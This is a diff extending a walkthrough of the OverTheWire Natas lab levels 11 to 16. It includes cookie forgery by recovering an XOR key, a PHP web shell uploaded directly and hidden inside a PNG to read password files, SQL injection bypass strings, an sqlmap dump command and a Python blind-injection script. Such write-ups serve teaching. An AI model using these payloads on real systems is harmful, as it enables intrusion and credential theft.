@@ -103,4 +103,205 @@ password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 
 
 Natas11:
+we have
+<?
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+?>
+
+and the website has the cookie "data", with value $cookie = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D".
+if we decode base64 decoded it, we get ($cookie XOR $key) = "0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67".
+so we just have to do the operation ($cookie) XOR ($cookie XOR $key) = $key to obtain the $key, which is "KNHL".
+then we change
+$malicious_data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+and print the corresponding encrypted cookie:
+$malicious_cookie = base64_encode(xor_encrypt(json_encode($malicious_data), "KNHL"));
+
+if we base64 decode
 base64 decoded 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-()n67
+password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+
+
+Natas13:
+<?php
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+inspecting the source code, we see that we need to modify the extension of the hidden POST request to have ".php" extension
+then we upload a malicious ".php" file
+
+shellcmd.php
+---------------------------------
+<?php system($_GET['cmd']); ?>  |
+---------------------------------
+
+we receive "The file upload/p7ht605awt.php has been uploaded".
+we do
+http://natas12.natas.labs.overthewire.org/upload/a32lyfq18m.php?cmd=cat /etc/natas_webpass/natas13
+password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+
+
+Natas14:
+In this case we have to hide php code in some image file.
+Just get some small size png file for example. I got mc-down.png from github.com/matmarqs/gamedev
+edit it with vim, or append the php code with
+echo "<?php system(\$_GET['cmd']); ?>" >> mc-down.png
+then upload this malicious png image to the server. don't forget to moidify the extension of the POST form to ".php"
+we get "The file upload/snkhtb0ecy.php has been uploaded".
+then we go to
+http://natas13.natas.labs.overthewire.org/upload/snkhtb0ecy.php?cmd=ls
+password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+
+Natas15:
+Basic SQL injection. Inspect the source code, and we can enter
+------------------------+
+Username: a" OR 1=1;#   |
+Password: asd           |
+------------------------+
+password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+
+
+Natas16:
+we see that we have a boolean based SQL Injection
+The username=natas16 exists
+If we were to manually do the SQLi, we would insert payloads to discover the password
+username=natas16" and password like "a%"
+
+After playing with sqlmap args a lot, we use the command
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --data="username=natas16" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --string="This user exists" --flush-session --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas15 -T users -C username,password --dump
+
+sqlmap gives us:
+
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| alice    | hROtsfM734                       |
+| natas16  | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |
++----------+----------------------------------+
+
+I also wrote my own SQL Injection script in python:
+----------------------------------------------------------------------------------------------------------------------------------+
+import requests                                                                                                                   |
+                                                                                                                                  |
+url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=True'                                                            |
+headers = {'Host': 'natas15.natas.labs.overthewire.org',                                                                          |
+           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',                                |
+           'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='}                                     |
+characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"                                                     |
+                                                                                                                                  |
+# like is boolean                                                                                                                 |
+# attempt is the password attempt                                                                                                 |
+def send_payload(attempt, like):                                                                                                  |
+    if like:                                                                                                                      |
+        query = f'password LIKE BINARY "{attempt}%'                                                                               |
+    else:                                                                                                                         |
+        query = f'password = BINARY "{attempt}'                                                                                   |
+    payload = {'username': f'natas16" and {query}'}                                                                               |
+    r = requests.post(url, data=payload, headers=headers)                                                                         |
+    raw = str(r.content)                                                                                                          |
+    return "This user exists." in raw                                                                                             |
+                                                                                                                                  |
+passwd = ""; found = False                                                                                                        |
+while not found:                                                                                                                  |
+    for c in characters:                                                                                                          |
+        correct = send_payload(passwd + c, like=True)                                                                             |
+        print("attempting:", passwd+c)                                                                                            |
+        if correct:                                                                                                               |
+            passwd += c                                                                                                           |
+            print("GOT IT:", passwd)                                                                                              |
+            found = send_payload(passwd, like=False)                                                                              |
+            break                                                                                                                 |
+                                                                                                                                  |
+print("\nThe password is", passwd)                                                                                                |
+----------------------------------------------------------------------------------------------------------------------------------+
+The BINARY is important because SQL queries are case-insensitive by default.
+
+password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+
+Natas17:
